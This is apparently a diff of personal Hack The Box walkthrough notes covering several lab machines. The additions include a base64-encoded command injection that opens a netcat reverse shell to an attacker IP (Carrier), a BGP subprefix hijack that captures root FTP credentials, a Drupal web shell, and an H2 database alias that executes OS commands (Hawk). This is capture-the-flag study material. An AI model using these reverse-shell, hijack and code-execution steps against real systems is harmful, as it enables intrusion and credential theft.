@@ -1,4 +1,3 @@
-
 HTB FROLIC
  
 1) As always enum
@@ -24,14 +23,14 @@ exploit/multi/http/playsms_uploadcsv_exec user and pass you got
 20)compile it like this gcc libc-search.c -o libc-search -lc -ldl and run
 21)search -s system then -s exit then -s execve
 22)search -p /bin/sh -b "libcstring"  --------> 0xb7e190003
-23)begin to make our exploit with perl
- 
+23)begin to make our exploit with python
 The exit address is: 0xb7e479d0
 The system address is: 0xb7e53da0
 The execve address is: 0xb7ec97e0
 The /bin/sh address is: 0xb7f74a0b
 cat /proc/$$/maps | grep stack bffdf000-c0000000 rw-p 00000000 00:00 0 [stack]
  
+## stack address begins wiht \x00 so we changed to \xe0
  
 exit() -> "\xd0\x79\xe4\xb7"; system() -> "\xa0\x3d\xe5\xb7"; execve() -> "\xe0\x97\xec\xb7"
 stack is \xe0\xf0\xfd\xbf
@@ -51,6 +50,59 @@ HTB CARRIER
 4)use snmpwalk -v 1 -c public 10.10.10.105
 5) got the number SN#NET_45JDX23
 6)Login with user admin and the pass
+7)Notice the diagnostics verify status
+8)capture the request with burp and notice check= parameter it ask for ps aux | grep quagga
+9)the commands must be encoded in base 64 to work
+9)so we can chain another command to it like nc but /bin/sh its giving us problems so we specify /bin/bash
+quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.x.x 4444 >/tmp/f
+in base64 encoded:
+cXVhZ2dhOyBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vYmFzaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjEzNCA0NDQ0ID4vdG1wL2Y=0)
+10)get user flag
+11) find the routes and from hint in login pages tickets we get:
+"one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network", and after flushing the iptables rules and just doing a ping sweep I found 10.120.15.1 and 10.120.15.10.encoded in base 64:
+ 
+12)10.120.15.10 has an FTP server, .1 does not. So I'm pretty sure 10.120.15.10 is the FTP server.
+ 
+I also tried injecting a network in bgpd.conf, namely:
+ 
+"network 10.120.15.0/21"
+ 
+Then systemctrl restart quagga.
+ 
+I then tried to sniff with tcpdump on eth1.
+ 
+Why eth1? Because from the diagram (diagram_for_tac.png) and a lot of network enumeration it seems:
+ 
+The box you get a shell on is AS100.
+The "important FTP server" is connected to AS300.
+AS100 is connected to both AS200 and AS300.
+Connections to the FTP server are probably originating from AS200. To reach 10.120.15.10 it need to go through AS300, we want it to go through us instead by claiming we have this prefix connected to us even when we don't.
+ 
+We receive traffic from AS200 on eth1, so eth1 it is.
+ 
+I didn't get anything though.
+ 
+But this would be just a prefix hijack, the ASPATH is just as long both going through us (AS100) as through AS300. Hence a subprefix hijack attack is needed, I think?
+ 
+In a subprefix hijack we need to announce a new prefix, i.e. a longer prefix, from what I understand from doing some reading. That means ... a more specific subnet?
+ 
+the FTP server is at 10.120.15.10, you need to configure eth2 up as that IP, and you need to inject a network with a long prefix, such as 10.120.15.8/29 into the bgpd.conf, .8 because the subnetmask only allows for a few hosts, and we want it to overlap with .10.
+ 
+Try that, and be aware of that pesky script under /opt which resets the whole thing, I just gave it a .bak extension to prevent the thing from running.
+ 
+Then you should start getting FTP traffic.
+ 
+so I set the eth2 adapter to 10.120.15.10 netmask 255.255.255.0 and added network 10.120.15.8/29 to the bgpd.conf file and changed the restore.sh to restore.sh.bak
+restart the quagga service
+Then start up nc and bind it to that IP and listen for incoming FTP:
+ 
+when it connects throw a 220 FTP response and then a 331 FTP response and it will get you the root credentials for you to ssh.
+13)credentials are:
+                        root:BGPtelc0rout1ng
+ 
+14)now login through ssh with new credentials ----->>> ssh root@10.10.10.105
+15)get root flag and secret
+ 
  
 HTB SECNOTES
 1)Enumeration with nmap discovering open ports full tcp scan all ports
@@ -97,7 +149,7 @@ HTB Bounty
 8)run post explotation module and exploit(root)
  
  
-TB WALDO
+HTB WALDO
  
 1) Usando burp suite se encuentra la ruta en la cual se puede hacer el directory transversal desde este se encuentra la vulnerabilidad y notamos que existe un filtro el cual se puede evadir usando ./ para ir al primer directorio y luego ....//(para saltar el filtro).
 2) Al encontrar la llave ssh del usuario nobody esta se debe formatear y se deben borrar todos los caracteres "\n"asi como "\"y se formatea en https://www.samltool.com/format_privatekey.php.
@@ -107,3 +159,62 @@ TB WALDO
 4)login again with the same ssh key from remote machine as monitor to localhost with args -t bash -norc" without quotes to break the default bash login
  
 5)run "/usr/bin/tac /root/root.txt
+ 
+HTB HAWK
+ 
+1)As usual enum nmap shows port 80, 21 , 22, 8082 ---> runing H2 DATABASE
+2)web page show login, register and few rabbit holes
+3)dirb shows a bunch of dirs and files none of those seems to help
+4)login through ftp on port 21 with user anonymous found a dir with a encrypted file on it
+5)using file + name of the encrypt file shows "openssl enc'd data with salted password, base64 encoded"
+6)research for a tool to do de decrypt procces and found https://github.com/deltaclock/go-openssl-bruteforce
+7)Download and bruteforce with ./openssl-brute -file /path
+8)decrypted file shows:
+Daniel,
+ 
+Following the password for the portal:
+ 
+PencilKeyboardScanner123
+ 
+Please let us know when the portal is ready.
+ 
+Kind Regards,
+ 
+IT department
+ 
+9)The credentials they sad are mean user daniel but for work in portal he needs to be admin so the user admin and password in the mail.
+10)login and search for modules and enable php filter save config and go to content>> article >> new article
+11) in name any name in content of the article paste your shell ill use p0wny shell.
+12)grab user flag
+13)enumerating for config files i was able to locate /var/www/html/sites/default/settings.php where it its stored the user and password for database which is drupal:drupal4hawk and trying it with daniel i managed to login through ssh.
+14)enumeration with enum4lin i was able to realize the service for h2 console when we acces through browser its says it only allows local connections to the service so we have to create a ssh tunnel to it:
+ 
+└──╼ #ssh -D 1080 -L6801:127.0.0.1:7082 -L6802:127.0.0.1:8082 daniel@10.10.10.102
+another way of ssh tunneling is:
+daniel@hawk:~$
+daniel@hawk:~$ <---here i type ~C ssh> -D 8082
+Forwarding port.
+ 
+then we can verify im listenning on this port on local machine:
+ 
+netstat -anlp | grep 8082
+tcp 0 0 127.0.0.1:8082 0.0.0.0:* LISTEN 3445/ssh
+tcp6 0 0 ::1:8082 :::* LISTEN 3445/ssh
+ 
+once we create the tunnel just access with 127.0.0.1:6802 for tunneling method 1 or 127.0.0.1:8082 for method 2 through browser .
+ 
+15)once we access we found by trial and error that database its test no ˜test and user was "sa" and password was the same "sa" so i login in and voila!
+ 
+16) once we got the H2 console so we can execute java code for creating an ALIAS and run
+ 
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\A"); return s.hasNext() ? s.next() : ""; }$$;
+ 
+then just CALL SHELLEXEC('cat root.txt')
+ 
+Another viable way its using 44422.py exploit from exploit.db with python3, python2 cause problems.
+ 
+with this command
+└──╼ #python3 44422.py -H 127.0.0.1:6802 -d jdbc:h2:tcp://10.10.10.102/~/drupal
+ 
+where the -d argument its the host where the database its allocated look we dont need any user and password just the exploit as it its with the correct database path -d jdbc:h2:tcp://10.10.10.102/~/drupal.
+DONE!!
